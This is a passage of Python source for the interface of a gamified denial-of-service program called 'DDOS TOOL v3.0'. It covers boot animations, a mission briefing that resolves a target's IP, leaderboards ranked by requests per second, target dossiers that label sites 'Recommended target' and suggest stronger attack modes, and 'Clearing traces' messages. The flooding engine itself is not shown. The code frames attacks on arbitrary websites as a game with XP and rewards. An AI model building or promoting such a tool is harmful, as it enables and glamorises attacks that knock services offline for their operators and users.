            ["        ▓        ", "      ▓▓▓▓▓      ", "    ▓▓▓▓▓▓▓▓▓    ", "   ▓▓▓▓▓▓▓▓▓▓▓   ", "  ▓▓▓▓▓▓▓▓▓▓▓▓▓  ", "   ▓▓▓▓▓▓▓▓▓▓▓   ", "    ▓▓▓▓▓▓▓▓▓    "],
            ["        █        ", "      █████      ", "    █████████    ", "   ███████████   ", "  █████████████  ", "   ███████████   ", "    █████████    "],
        ]
    }
    
    frames = explosions.get(size, explosions["medium"])
    
    for frame in frames:
        console.print()
        for line in frame:
            console.print(line.center(70))
        await asyncio.sleep(0.15)
        # Clear
        for _ in range(len(frame) + 2):
            console.print()

async def boot_sequence():
    """Fake BIOS/system boot sequence"""
    console.clear()
    
    console.print("DDOS TOOL v3.0 - SYSTEM INITIALIZATION")
    console.print("" + "─" * 70 + "")
    console.print()
    
    # Memory check
    console.print("Checking memory...", end="")
    await asyncio.sleep(0.3)
    console.print(" OK")
    
    # System modules
    modules = [
        "Attack engine",
        "Network interface",
        "Encryption module",
        "Proxy handler",
        "DNS resolver",
        "Packet generator",
    ]
    
    for module in modules:
        console.print(f"Loading {module}...", end="")
        await asyncio.sleep(0.2)
        console.print(" OK")
    
    # Hardware detection
    console.print()
    console.print("Detecting hardware:")
    await asyncio.sleep(0.2)
    console.print(f"  CPU: {psutil.cpu_count()} cores detected")
    await asyncio.sleep(0.2)
    mem = psutil.virtual_memory().total / (1024**3)
    console.print(f"  RAM: {mem:.1f} GB available")
    await asyncio.sleep(0.2)
    console.print(f"  Network: Active")
    
    console.print()
    console.print("System ready")
    await asyncio.sleep(0.5)

async def mission_briefing(target_url: str, mode: str):
    """Pre-attack mission briefing"""
    console.print()
    console.print("" + "═" * 70 + "")
    console.print("MISSION BRIEFING".center(70))
    console.print("" + "═" * 70 + "")
    console.print()
    
    # Target analysis
    console.print("TARGET ANALYSIS:")
    await asyncio.sleep(0.3)
    console.print(f"  URL: {target_url}")
    
    # Try to get IP
    try:
        parsed = urllib.parse.urlparse(target_url)
        hostname = parsed.hostname
        if hostname:
            ip = socket.gethostbyname(hostname)
            console.print(f"  IP: {ip}")
    except:
        pass
    
    await asyncio.sleep(0.3)
    
    # Estimated difficulty
    difficulty = random.choice(["LOW", "MEDIUM", "HIGH"])
    console.print(f"  Estimated difficulty: {difficulty}")
    
    await asyncio.sleep(0.3)
    
    # Attack mode
    mode_info = ATTACK_MODES.get(mode, ATTACK_MODES["normal"])
    console.print()
    console.print(f"ATTACK MODE: {mode_info['name']}")
    console.print(f"  Threads: {mode_info['threads']}")
    console.print(f"  Strategy: {'Stealth' if mode == 'stealth' else 'Maximum power'}")
    
    await asyncio.sleep(0.3)
    
    # Risk assessment
    console.print()
    console.print("RISK ASSESSMENT:")
    console.print("  Detection risk: Medium")
    console.print("  Success probability: High")
    
    await asyncio.sleep(0.5)
    console.print()
    console.print("" + "═" * 70 + "")
    console.print()

async def epilogue_sequence():
    """Post-attack epilogue"""
    console.print()
    console.print("" + "─" * 70 + "")
    console.print()
    
    messages = [
        "Disconnecting from target",
        "Clearing traces",
        "Closing connections",
        "Finalizing report",
    ]
    
    for msg in messages:
        for i in range(3):
            console.print(f"\r{msg}{'.' * (i+1)}", end="")
            await asyncio.sleep(0.2)
        console.print(f"\r{msg}... DONE")
    
    console.print()
    console.print("" + "─" * 70 + "")
    await asyncio.sleep(0.3)

def update_leaderboard(stats: dict, target_url: str, elapsed: float):
    """Update top 10 leaderboard"""
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    success_rate = (stats["success"] / max(stats["total"], 1)) * 100
    
    entry = {
        "target": target_url[:40],
        "requests": stats["total"],
        "rps": rps,
        "success_rate": success_rate,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    
    session_stats["leaderboard"].append(entry)
    session_stats["leaderboard"].sort(key=lambda x: x["rps"], reverse=True)
    session_stats["leaderboard"] = session_stats["leaderboard"][:10]

def show_leaderboard():
    """Display top 10 attacks"""
    if not session_stats["leaderboard"]:
        return
    
    console.print()
    console.print("TOP 10 ATTACKS THIS SESSION")
    console.print("" + "─" * 70 + "")
    
    for i, entry in enumerate(session_stats["leaderboard"][:10], 1):
        rank_symbol = ["█", "▓", "▒"][min(i-1, 2)] if i <= 3 else "░"
        console.print(
            f"{rank_symbol} {i:2d}. {entry['target']:40s} "
            f"{entry['rps']:6.0f} RPS  {entry['success_rate']:5.1f}%"
        )
    
    console.print("" + "─" * 70 + "")
    console.print()

async def animated_outro(success_rate: float):
    """Animated outro with glitch effect"""
    console.clear()
    
    # Choose banner based on success rate
    banner = VICTORY_BANNER if success_rate >= 50 else DEFEAT_BANNER
    
    # Glitch effect
    for _ in range(3):
        console.clear()
        await asyncio.sleep(0.1)
        for line in banner.split('\n'):
            if random.random() < 0.2:
                glitched = ''.join(random.choice(['█', '▓', '▒', '░', c]) for c in line)
                console.print(f"{glitched}")
            else:
                console.print(f"{line}")
        await asyncio.sleep(0.1)
    
    # Final clean display
    console.clear()
    for line in banner.split('\n'):
        console.print(f"{line}")
    
    await asyncio.sleep(0.5)

async def show_advanced_menu():
    """ULTIMATE MAIN MENU - The best part of the design"""
    console.clear()
    
    # Animated title with glitch effect
    await glitch_title("[ DDOS TOOL - MAIN MENU ]", 0.5)
    console.print()
    
    # Animated loading bar for style
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Initializing interface...", style="white"),
        BarColumn(complete_style="bright_white", finished_style="bright_white", bar_width=40),
        transient=True
    ) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            await asyncio.sleep(0.005)
    
    console.print()
    
    # Operator status with beautiful layout
    playtime = int(time.time() - session_stats["session_start"])
    hours = playtime // 3600
    minutes = (playtime % 3600) // 60
    
    # Create beautiful stats grid
    stats_grid = Table.grid(padding=(0, 4))
    stats_grid.add_column(style="white", justify="left", width=35)
    stats_grid.add_column(style="white", justify="right", width=35)
    
    stats_grid.add_row(
        f"[bright_white]Level {session_stats['level']}[/bright_white] [white]{session_stats['title']}[/white]",
        f"[white]Rank:[/white] [bright_white]{session_stats['rank']}[/bright_white]"
    )
    stats_grid.add_row(
        f"[white]XP:[/white] [bright_white]{session_stats['xp']:,}[/bright_white]",
        f"[white]Currency:[/white] [bright_white]{session_stats['currency']:,}[/bright_white]"
    )
    stats_grid.add_row(
        f"[white]Playtime:[/white] [bright_white]{hours}h {minutes}m[/bright_white]",
        f"[white]Attacks:[/white] [bright_white]{session_stats['total_attacks']}[/bright_white]"
    )
    
    # Beautiful operator status panel
    operator_panel = Panel(
        Align.center(stats_grid),
        title="[bright_white]═══ OPERATOR STATUS ═══[/bright_white]",
        border_style="bright_white",
        padding=(1, 2),
        subtitle="[white]System Ready[/white]"
    )
    console.print(operator_panel)
    console.print()
    
    # Animated separator
    separator = "".join(random.choice(['─', '═']) for _ in range(70))
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    # Main menu with beautiful icons and layout
    menu_grid = Table.grid(padding=(0, 3))
    menu_grid.add_column(style="bright_white", justify="center", width=10)
    menu_grid.add_column(style="white", justify="left", width=25)
    menu_grid.add_column(style="bright_white", justify="center", width=10)
    menu_grid.add_column(style="white", justify="left", width=25)
    
    # Two-column layout for cleaner look
    menu_grid.add_row(
        "[bright_white][1][/bright_white]", "[white]Start New Attack[/white]",
        "[bright_white][6][/bright_white]", "[white]Achievements[/white]"
    )
    menu_grid.add_row(
        "[bright_white][2][/bright_white]", "[white]Attack History[/white]",
        "[bright_white][7][/bright_white]", "[white]Leaderboard[/white]"
    )
    menu_grid.add_row(
        "[bright_white][3][/bright_white]", "[white]Target Profiles[/white]",
        "[bright_white][8][/bright_white]", "[white]Boss Battles[/white]"
    )
    menu_grid.add_row(
        "[bright_white][4][/bright_white]", "[white]Skill Tree[/white]",
        "[bright_white][9][/bright_white]", "[white]Settings[/white]"
    )
    menu_grid.add_row(
        "[bright_white][5][/bright_white]", "[white]Equipment Shop[/white]",
        "[bright_white][0][/bright_white]", "[white]Prestige[/white]"
    )
    
    console.print()
    
    # Beautiful menu panel with double border effect
    menu_panel = Panel(
        Align.center(menu_grid),
        title="[bright_white]╔═══════════════════════════════════════════════════════════════════╗[/bright_white]",
        subtitle="[bright_white]╚═══════════════════════════════════════════════════════════════════╝[/bright_white]",
        border_style="bright_white",
        padding=(2, 4)
    )
    console.print(menu_panel)
    console.print()
    
    # Quit option separately for emphasis
    quit_text = Text("[ Q ] Quit System", style="white", justify="center")
    console.print(quit_text)
    console.print()
    
    # Animated prompt
    separator2 = "".join(random.choice(['─', '═']) for _ in range(70))
    console.print(f"[white]{separator2}[/white]", justify="center")
    console.print()
    
    # Simple prompt without animation to avoid escape codes
    console.print("[bright_white]>>>[/bright_white] [white]Select option:[/white] ", end="")
    
    choice = Prompt.ask(
        "",
        choices=["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "q", "Q"],
        default="1",
        show_choices=False
    )
    
    # Selection confirmation animation
    console.print()
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Processing selection...", style="white"),
        transient=True
    ) as progress:
        task = progress.add_task("", total=50)
        for i in range(50):
            progress.update(task, advance=1)
            await asyncio.sleep(0.004)  # 2.5x faster!
    
    return choice.lower()

async def show_attack_history():
    """ULTIMATE ATTACK HISTORY - Complete data visualization"""
    console.clear()
    console.print()
    
    # Animated title
    await glitch_title("[ ATTACK HISTORY DATABASE ]", 0.4)
    console.print()
    
    # Loading animation
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Loading attack records...", style="white"),
        BarColumn(complete_style="bright_white", finished_style="bright_white", bar_width=40),
        transient=True
    ) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            await asyncio.sleep(0.001)  # 3x faster!
    
    console.print()
    
    history = get_attack_history(50)
    
    if not history:
        no_data_panel = Panel(
            Align.center("[white]No attack history found[/white]\n[white]Complete your first attack to see records here[/white]"),
            title="[bright_white]═══ NO RECORDS ═══[/bright_white]",
            border_style="white",
            padding=(2, 4)
        )
        console.print(no_data_panel)
    else:
        # ═══════════════════════════════════════════════════════════════
        # STATISTICS DASHBOARD
        # ═══════════════════════════════════════════════════════════════
        
        total_attacks = len(history)
        total_requests = sum(a['total_requests'] for a in history)
        avg_rps = sum(a['rps'] for a in history) / total_attacks if total_attacks > 0 else 0
        avg_success = sum(a['success_rate'] for a in history) / total_attacks if total_attacks > 0 else 0
        
        stats_grid = Table.grid(padding=(0, 4))
        stats_grid.add_column(style="white", width=25)
        stats_grid.add_column(style="bright_white", width=20, justify="right")
        stats_grid.add_column(style="white", width=25)
        stats_grid.add_column(style="bright_white", width=20, justify="right")
        
        stats_grid.add_row("TOTAL ATTACKS:", f"{total_attacks:,}", "AVG SUCCESS RATE:", f"{avg_success:.1f}%")
        stats_grid.add_row("TOTAL REQUESTS:", f"{total_requests:,}", "AVG RPS:", f"{avg_rps:,.0f}")
        
        stats_panel = Panel(
            stats_grid,
            title="[bright_white]═══ STATISTICS OVERVIEW ═══[/bright_white]",
            border_style="bright_white",
            padding=(1, 2)
        )
        console.print(stats_panel)
        console.print()
        
        # ═══════════════════════════════════════════════════════════════
        # TIMELINE VISUALIZATION (Last 10 attacks)
        # ═══════════════════════════════════════════════════════════════
        
        if len(history) >= 2:
            timeline_data = [a['rps'] for a in history[:10]]
            timeline_data.reverse()  # Oldest to newest
            
            # Create sparkline
            sparkline = create_sparkline(timeline_data, width=50)
            
            timeline_grid = Table.grid(padding=(0, 2))
            timeline_grid.add_column(style="white", width=20)
            timeline_grid.add_column(style="bright_white", width=60)
            
            timeline_grid.add_row("RPS TREND:", sparkline)
            timeline_grid.add_row("", "[white](Last 10 attacks, left=oldest, right=newest)[/white]")
            
            timeline_panel = Panel(
                timeline_grid,
                title="[bright_white]═══ PERFORMANCE TIMELINE ═══[/bright_white]",
                border_style="white",
                padding=(1, 2)
            )
            console.print(timeline_panel)
            console.print()
        
        # ═══════════════════════════════════════════════════════════════
        # ATTACK RECORDS TABLE
        # ═══════════════════════════════════════════════════════════════
        
        history_table = Table(
            show_header=True,
            header_style="bright_white bold",
            border_style="white",
            padding=(0, 1),
            box=box.DOUBLE_EDGE
        )
        history_table.add_column("#", style="bright_white", width=4, justify="center")
        history_table.add_column("Target", style="white", width=35)
        history_table.add_column("Date", style="white", width=16, justify="center")
        history_table.add_column("Requests", style="bright_white", width=12, justify="right")
        history_table.add_column("RPS", style="bright_white", width=8, justify="right")
        history_table.add_column("Success", style="white", width=8, justify="right")
        history_table.add_column("Grade", style="bright_white", width=6, justify="center")
        
        for i, attack in enumerate(history[:15], 1):
            timestamp = datetime.fromisoformat(attack["timestamp"]).strftime("%Y-%m-%d %H:%M")
            
            # Success rate bar
            success_pct = attack['success_rate']
            bar_length = int(success_pct / 10)
            success_bar = "█" * bar_length + "░" * (10 - bar_length)
            
            history_table.add_row(
                str(i),
                attack['target'][:35],
                timestamp,
                f"{attack['total_requests']:,}",
                f"{attack['rps']:.0f}",
                f"{success_pct:.0f}%",
                attack['grade']
            )
        
        # Wrap in panel
        history_panel = Panel(
            history_table,
            title="[bright_white]═══ RECENT ATTACK RECORDS ═══[/bright_white]",
            border_style="bright_white",
            padding=(1, 2),
            subtitle=f"[white]Showing {min(15, len(history))} of {len(history)} total attacks[/white]"
        )
        console.print(history_panel)
        
        # ═══════════════════════════════════════════════════════════════
        # TOP PERFORMERS
        # ═══════════════════════════════════════════════════════════════
        
        if len(history) >= 3:
            console.print()
            
            # Sort by RPS
            top_rps = sorted(history, key=lambda x: x['rps'], reverse=True)[:3]
            
            top_grid = Table.grid(padding=(0, 2))
            top_grid.add_column(style="bright_white", width=5)
            top_grid.add_column(style="white", width=35)
            top_grid.add_column(style="bright_white", width=15, justify="right")
            
            for idx, attack in enumerate(top_rps, 1):
                medal = "🥇" if idx == 1 else "🥈" if idx == 2 else "🥉"
                top_grid.add_row(
                    f"#{idx}",
                    attack['target'][:35],
                    f"{attack['rps']:,.0f} RPS"
                )
            
            top_panel = Panel(
                top_grid,
                title="[bright_white]═══ TOP 3 HIGHEST RPS ═══[/bright_white]",
                border_style="white",
                padding=(1, 2)
            )
            console.print(top_panel)
    
    console.print()
    separator = "".join(['═'] * 70)
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    input("[bright_white]>>>[/bright_white] [white]Press ENTER to continue...[/white]")


async def show_target_profiles():
    """ULTIMATE TARGET PROFILES - Intelligence dossier system"""
    console.clear()
    console.print()
    
    # Animated title
    await glitch_title("[ TARGET INTELLIGENCE DATABASE ]", 0.4)
    console.print()
    
    # Classification banner
    class_banner = Text("CLASSIFIED // EYES ONLY // SECURITY CLEARANCE REQUIRED", style="bright_white bold", justify="center")
    console.print(class_banner)
    console.print()
    
    # Loading animation
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Accessing classified database...", style="white"),
        BarColumn(complete_style="bright_white", finished_style="bright_white", bar_width=40),
        transient=True
    ) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            await asyncio.sleep(0.001)  # 4x faster!
    
    console.print()
    
    # Get all profiles
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM target_profiles ORDER BY total_attacks DESC LIMIT 10')
        profiles = cursor.fetchall()
        conn.close()
        
        if not profiles:
            no_data_panel = Panel(
                Align.center("[white]No target profiles found[/white]\n[white]Attack targets to build intelligence database[/white]"),
                title="[bright_white]═══ NO PROFILES ═══[/bright_white]",
                border_style="white",
                padding=(2, 4)
            )
            console.print(no_data_panel)
        else:
            # Display each profile as a dossier card
            for idx, profile in enumerate(profiles, 1):
                target = profile[0]
                first_seen = profile[1]
                last_attacked = profile[2]
                total_attacks = profile[3]
                avg_success = profile[4]
                best_rps = profile[5]
                vulnerability = profile[6]
                
                # Create dossier card
                dossier_grid = Table.grid(padding=(0, 2))
                dossier_grid.add_column(style="white", width=25)
                dossier_grid.add_column(style="bright_white", width=50)
                
                dossier_grid.add_row("TARGET:", target[:50])
                dossier_grid.add_row("FIRST SEEN:", first_seen[:19])
                dossier_grid.add_row("LAST ATTACK:", last_attacked[:19])
                dossier_grid.add_row("", "")
                
                # Vulnerability assessment with bars
                vuln_bar = "█" * (vulnerability // 10) + "░" * (10 - vulnerability // 10)
                threat_level = "HIGH" if vulnerability > 70 else "MEDIUM" if vulnerability > 40 else "LOW"
                
                dossier_grid.add_row("VULNERABILITY:", f"{vuln_bar} {vulnerability}%")
                dossier_grid.add_row("THREAT LEVEL:", threat_level)
                dossier_grid.add_row("", "")
                
                # Attack statistics
                dossier_grid.add_row("TOTAL ATTACKS:", f"{total_attacks}")
                dossier_grid.add_row("AVG SUCCESS:", f"{avg_success:.1f}%")
                dossier_grid.add_row("BEST RPS:", f"{best_rps:,.0f}")
                dossier_grid.add_row("", "")
                
                # Recommendation
                if avg_success > 80:
                    recommendation = "✓ Highly vulnerable - Recommended target"
                elif avg_success > 50:
                    recommendation = "○ Moderate defenses - Use AGGRESSIVE mode"
                else:
                    recommendation = "⚠ Strong defenses - Use ULTRA mode or higher"
                
                dossier_grid.add_row("ASSESSMENT:", recommendation)
                
                # Create panel
                status_color = "bright_white" if vulnerability > 70 else "white"
                dossier_panel = Panel(
                    dossier_grid,
                    title=f"[{status_color}]═══ DOSSIER #{idx} ═══[/{status_color}]",
                    border_style=status_color,
                    padding=(1, 2)
                )
                console.print(dossier_panel)
                
                if idx < len(profiles):
                    console.print()
            
            # Summary statistics
            console.print()
            separator = "".join(['═'] * 70)
            console.print(f"[white]{separator}[/white]", justify="center")
            console.print()
            
            summary_text = f"[white]Total Profiles: {len(profiles)} | Most Vulnerable: {profiles[0][0][:30]} ({profiles[0][6]}%)[/white]"
            console.print(summary_text, justify="center")
            
    except Exception as e:
        error_panel = Panel(
            Align.center(f"[white]Error loading profiles: {str(e)}[/white]"),
            title="[bright_white]═══ ERROR ═══[/bright_white]",
            border_style="white",
            padding=(2, 4)
        )
        console.print(error_panel)
    
    console.print()
    separator = "".join(['═'] * 70)
    console.print(f"[white]{separator}[/white]", justify="center")
    console.print()
    
    input("[bright_white]>>>[/bright_white] [white]Press ENTER to continue...[/white]")

async def show_skill_tree():
    """Display and upgrade skill tree"""
    console.clear()
    console.print()
    console.print("SKILL TREE".center(70))
    console.print("" + "─" * 70 + "")
    console.print()
    console.print(f"Available Skill Points: {session_stats['skill_points']}")
    console.print()
    
    for skill_id, skill_data in SKILL_TREE.items():
        current_level = session_stats["skills"][skill_id]
        max_level = skill_data["levels"]
        
        if current_level < max_level:
            next_cost = skill_data["cost"][current_level]
            console.print(f"{skill_data['name']} [{current_level}/{max_level}]")
            console.print(f"  {skill_data['effect']}")
            console.print(f"  Next level cost: {next_cost} SP")
        else:
            console.print(f"{skill_data['name']} [MAX]")
            console.print(f"  {skill_data['effect']}")
        console.print()
    
    console.print("Enter skill name to upgrade, or press ENTER to go back")
    choice = input("> ").strip().lower()
    
    if choice in SKILL_TREE:
        skill_data = SKILL_TREE[choice]
        current_level = session_stats["skills"][choice]
        
        if current_level < skill_data["levels"]:
            cost = skill_data["cost"][current_level]
            if session_stats["skill_points"] >= cost:
                session_stats["skill_points"] -= cost
                session_stats["skills"][choice] += 1
                console.print(f"Upgraded {skill_data['name']} to level {session_stats['skills'][choice]}!")
                await asyncio.sleep(1)
            else:
                console.print("Not enough skill points!")
                await asyncio.sleep(1)
        else:
            console.print("Skill already at max level!")
            await asyncio.sleep(1)

async def show_equipment_shop():
    """Display equipment shop"""
    console.clear()
    console.print()
    console.print("EQUIPMENT SHOP".center(70))
    console.print("" + "─" * 70 + "")
    console.print()
    console.print(f"Currency: {session_stats['currency']}")
    console.print()
    
    # Show current equipment
    console.print("Current Equipment:")
    weapon = EQUIPMENT["weapon"][session_stats["equipment"]["weapon"]]
    armor = EQUIPMENT["armor"][session_stats["equipment"]["armor"]]
    accessory = EQUIPMENT["accessory"][session_stats["equipment"]["accessory"]]
    
    console.print(f"  Weapon: {weapon['name']} (+{weapon['rps_bonus']} RPS)")
    console.print(f"  Armor: {armor['name']} (+{armor['efficiency_bonus']}% Efficiency)")
    console.print(f"  Accessory: {accessory['name']} (+{accessory['xp_bonus']}% XP)")
    console.print()
    
    # Show available weapons
    console.print("Available Weapons:")
    for i, (item_id, item_data) in enumerate(EQUIPMENT["weapon"].items(), 1):
        owned = "✓" if session_stats["equipment"]["weapon"] == item_id else " "
        console.print(f"  [{owned}] {i}. {item_data['name']} - {item_data['cost']} currency (+{item_data['rps_bonus']} RPS)")
    console.print()
    
    input("Press ENTER to continue...")

async def show_boss_battles():
    """Display boss battle menu"""
    console.clear()
    console.print()
    console.print("BOSS BATTLES".center(70))
    console.print("" + "─" * 70 + "")
    console.print()
    console.print("Challenge legendary targets for massive rewards!")
    console.print()
    
    for i, (boss_id, boss_data) in enumerate(BOSS_TARGETS.items(), 1):
        defeated = "✓" if boss_id in session_stats["boss_defeated"] else " "
        console.print(f"[{defeated}] {i}. {boss_data['name']}")
        console.print(f"    Difficulty: {boss_data['difficulty']} | Reward: {boss_data['reward_xp']} XP + {boss_data['reward_title']}")
        console.print()
    
    input("Press ENTER to continue...")

async def show_prestige_menu():
    """Show prestige menu"""
    console.clear()
    console.print()
    console.print("PRESTIGE SYSTEM".center(70))
    console.print("" + "─" * 70 + "")
    console.print()
    console.print("Reset your level to 1 but gain permanent bonuses!")
    console.print()
    console.print(f"Current Prestige: {session_stats['prestige']}")
    console.print(f"Current Level: {session_stats['level']}")
    console.print()
    
    if session_stats["level"] >= 50:
        next_prestige = session_stats["prestige"] + 1
        if next_prestige <= 5:
            prestige_data = PRESTIGE_LEVELS[next_prestige]
            console.print(f"Next Prestige: {prestige_data['name']}")
            console.print(f"  XP Bonus: +{int((prestige_data['bonus_xp'] - 1) * 100)}%")
            console.print(f"  RPS Bonus: +{int((prestige_data['bonus_rps'] - 1) * 100)}%")
            console.print()
            
            confirm = Prompt.ask("Prestige now? (yes/no)", choices=["yes", "no"], default="no")
            if confirm == "yes":
                session_stats["prestige"] = next_prestige
                session_stats["level"] = 1
                session_stats["xp"] = 0
                console.print(">>> PRESTIGE ACTIVATED <<<")
                await asyncio.sleep(1.5)
        else:
            console.print("Maximum prestige reached!")
    else:
        console.print("Reach level 50 to prestige!")
    
    await asyncio.sleep(1)

async def animated_intro():
    """INSANE eDEX-UI style intro with Rich library - pure white/grey"""
    console.clear()
    
    # Stage 1: Glitch effect on logo
    for _ in range(3):
        console.clear()
        glitched_logo = ""
        for line in ASCII_LOGO.split('\n'):
            if random.random() < 0.15:
                glitched = ''.join(random.choice(['█', '▓', '▒', '░', c]) for c in line)
                glitched_logo += glitched + "\n"
            else:
                glitched_logo += line + "\n"
        
        console.print(glitched_logo, style="white")
        await asyncio.sleep(0.1)
    
    # Stage 2: Clean logo reveal
    console.clear()
    for line in ASCII_LOGO.split('\n'):
        console.print(line, style="white")
        await asyncio.sleep(0.01)  # 3x faster!
    
    console.print()
    
    # Stage 3: System info with Rich Panel
    system_info = Table.grid(padding=(0, 2))
    system_info.add_column(style="white", justify="left")
    system_info.add_column(style="bright_white", justify="right")
    
    system_data = [
        ("HOSTNAME", socket.gethostname()),
        ("PLATFORM", sys.platform.upper()),
        ("CPU CORES", str(psutil.cpu_count())),
        ("MEMORY", f"{psutil.virtual_memory().total / (1024**3):.1f} GB"),
        ("DISK", f"{psutil.disk_usage('/').total / (1024**3):.0f} GB"),
        ("NETWORK", "ACTIVE"),
    ]
    
    # Animate system info
    for label, value in system_data:
        # Show loading
        temp_table = Table.grid(padding=(0, 2))
        temp_table.add_column(style="white", justify="left")
        temp_table.add_column(style="bright_white", justify="right")
        
        for prev_label, prev_value in system_data[:system_data.index((label, value))]:
            temp_table.add_row(prev_label, prev_value)
        
        temp_table.add_row(label, "...")
        
        panel = Panel(
            temp_table,
            title="[white]SYSTEM INFORMATION[/white]",
            border_style="white",
            padding=(1, 2)
        )
        
        console.clear()
        for line in ASCII_LOGO.split('\n'):
            console.print(line, style="white")
        console.print()
        console.print(panel)
        
        await asyncio.sleep(0.3)
        
        # Show actual value
        system_info.add_row(label, value)
    
    # Final system info display
    panel = Panel(
        system_info,
        title="[white]SYSTEM INFORMATION[/white]",
        border_style="white",
        padding=(1, 2)
    )
    
    console.clear()
    for line in ASCII_LOGO.split('\n'):
        console.print(line, style="white")
    console.print()
    console.print(panel)
    await asyncio.sleep(1)
    
    # Stage 4: Module loading with Rich Progress
    console.print()
    
    modules = [
        "ATTACK ENGINE",
        "NETWORK STACK",
        "CRYPTO MODULE",
        "ANALYTICS AI",
        "DATABASE CORE",
        "POWER SYSTEMS",
    ]
    
    with Progress(
        SpinnerColumn(style="white"),
        TextColumn("[white]{task.description}"),
        BarColumn(complete_style="white", finished_style="bright_white"),
        TextColumn("[white]{task.percentage:>3.0f}%"),
        console=console,
    ) as progress:
        
        for module in modules:
            task = progress.add_task(f"{module:15s}", total=100)
            
            for i in range(100):
                progress.update(task, advance=1)
                await asyncio.sleep(0.003)  # 3x faster!
    
    console.print()
    
    # Stage 5: Network scan
    scan_table = Table(show_header=True, header_style="white", border_style="white")
    scan_table.add_column("STATUS", style="white", width=6)
    scan_table.add_column("ADDRESS", style="white", width=25)
    scan_table.add_column("PORT", style="white", width=8)
    scan_table.add_column("STATE", style="bright_white", width=12)
    
    for _ in range(8):
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        port = random.randint(1000, 9999)
        status = random.choice(["OPEN", "CLOSED", "FILTERED"])
        symbol = "▓" if status == "OPEN" else "░"
        
        scan_table.add_row(symbol, ip, str(port), status)
        
        panel = Panel(
            scan_table,
            title="[white]NETWORK SCAN[/white]",
            border_style="white",
            padding=(1, 2)
        )
        
        console.print(panel)
        await asyncio.sleep(0.15)
        console.clear()
        for line in ASCII_LOGO.split('\n'):
            console.print(line, style="white")
        console.print()
    
    console.print(panel)
    await asyncio.sleep(0.5)
    console.print()
    
    # Stage 6: Data stream
    stream_text = ""
    for _ in range(5):
        hex_line = " ".join([f"{random.randint(0, 255):02X}" for _ in range(20)])
        stream_text += hex_line + "\n"
    
    stream_panel = Panel(
        stream_text.strip(),
        title="[white]DATA STREAM[/white]",
        border_style="white",
        padding=(1, 2)
    )
    console.print(stream_panel)
    await asyncio.sleep(0.5)
    console.print()
    
    # Stage 7: Power calibration
    power_table = Table.grid(padding=(0, 2))
    power_table.add_column(style="white", justify="left", width=30)
    power_table.add_column(style="bright_white", justify="right", width=20)
    
    power_metrics = [
        ("THREAD CAPACITY", "100,000"),
        ("MAX RPS", "9,000,000+"),
        ("POWER MULTIPLIER", "90,000x"),
        ("ATTACK MODES", "12"),
        ("SYSTEMS ONLINE", "18"),
    ]
    
    for metric, value in power_metrics:
        power_table.add_row(metric, value)
    
    power_panel = Panel(
        power_table,
        title="[white]POWER CALIBRATION[/white]",
        border_style="bright_white",
        padding=(1, 2)
    )
    console.print(power_panel)
    await asyncio.sleep(1)
    console.print()
    
    # Stage 8: Ready message
    ready_text = Text("SYSTEM ARMED", style="bright_white bold", justify="center")
    ready_panel = Panel(
        Align.center(ready_text, vertical="middle"),
        border_style="bright_white",
        padding=(1, 0),
        height=5
    )
    console.print(ready_panel)
    await asyncio.sleep(1)
    console.print()
    
    # Final message
    final_text = Text("▓▓▓ READY TO ATTACK ▓▓▓", style="bright_white bold", justify="center")
    final_panel = Panel(
        Align.center(final_text, vertical="middle"),
        border_style="bright_white",
        padding=(1, 0),
        height=5
    )
    console.print(final_panel)
    await asyncio.sleep(1)


async def get_simple_input() -> dict:
    """ULTIMATE MISSION CONFIGURATION - History-making interface"""
    
    console.clear()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 1: MISSION BRIEFING HEADER
    # ═══════════════════════════════════════════════════════════════
    
    await glitch_title("[ MISSION CONFIGURATION ]", 0.4)
    console.print()
    
    # Animated mission briefing
    briefing_grid = Table.grid(padding=(0, 2))
    briefing_grid.add_column(style="bright_white bold", justify="center")
    briefing_grid.add_column(style="white", justify="center")
    briefing_grid.add_column(style="bright_white", justify="center")
    briefing_grid.add_column(style="white", justify="center")
    briefing_grid.add_column(style="bright_white bold", justify="center")
    
    briefing_grid.add_row("CLASSIFIED", "//", "OPERATION BLACKOUT", "//", "CLEARANCE: MAXIMUM")
    
    briefing_panel = Panel(
        Align.center(briefing_grid),
        border_style="bright_white",
        padding=(0, 2)
    )
    console.print(briefing_panel)
    console.print()
    
    # Loading mission parameters
    with Progress(
        SpinnerColumn(style="bright_white"),
        TextColumn("[white]Loading mission parameters...", style="white"),
        BarColumn(complete_style="bright_white", finished_style="bright_white", bar_width=40),
        transient=True
    ) as progress:
        task = progress.add_task("", total=100)
        for i in range(100):
            progress.update(task, advance=1)
            await asyncio.sleep(0.002)  # 2.5x faster!
    
    console.print()
    
    # ═══════════════════════════════════════════════════════════════
    # STAGE 2: TARGET ACQUISITION WITH RADAR
    # ═══════════════════════════════════════════════════════════════
    
    await glitch_title("[ TARGET ACQUISITION SYSTEM ]", 0.3)
    console.print()
    
    # Radar scanning animation
    radar_art = [
        "              ╔═══════════════════════════════════════╗",
        "              ║     SCANNING FOR TARGETS...           ║",
        "              ║                                       ║",
        "              ║          ░░░░░░░░░░░░░░░░             ║",
        "              ║       ░░░░░░░░░░░░░░░░░░░░░░          ║",
        "              ║     ░░░░░░░░░░░░░░░░░░░░░░░░░░        ║",
        "              ║    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░       ║",
        "              ║     ░░░░░░░░░░░░░░░░░░░░░░░░░░        ║",
